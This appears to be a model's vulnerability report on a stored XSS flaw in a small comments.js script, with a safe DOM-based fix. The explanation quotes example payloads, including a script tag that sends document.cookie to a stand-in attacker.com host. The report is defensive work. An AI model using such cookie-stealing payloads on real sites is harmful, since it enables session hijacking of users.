response_text:
**1. Vulnerability Class:** Cross-Site Scripting (XSS) (CWE-79)

**2. File and Line Number:** `comments.js`, line 4

**3. Explanation:** 
The code uses the `.innerHTML` property to insert `comment.author` and `comment.body` into the DOM. Since these values are fetched from an API and not sanitized, an attacker can provide a payload containing malicious HTML or JavaScript (e.g., `<img src=x onerror=alert(1)>` or `<script>fetch('https://attacker.com/steal?c=' + document.cookie)</script>`). When a user views the comments, the browser will execute this injected script in the context of the user's session, potentially allowing the attacker to steal session cookies, perform actions on behalf of the user, or deface the page.

**4. Proposed Fix:**
Avoid using `.innerHTML` with untrusted data. Instead, use `.textContent` to ensure the input is treated strictly as text, or use DOM manipulation methods to build the structure safely.

```javascript
function renderComment(comment) {
    const div = document.createElement("div");
    div.className = "comment";

    // Create a bold element for the author
    const authorElement = document.createElement("b");
    authorElement.textContent = comment.author + ":";

    // Create a text node for the comment body
    const bodyText = document.createTextNode(" " + comment.body);

    // Append elements safely
    div.appendChild(authorElement);
    div.appendChild(bodyText);

    document.getElementById("comments").appendChild(div);
}

fetch("/api/comments").then(r => r.json()).then(cs => cs.forEach(renderComment));
```

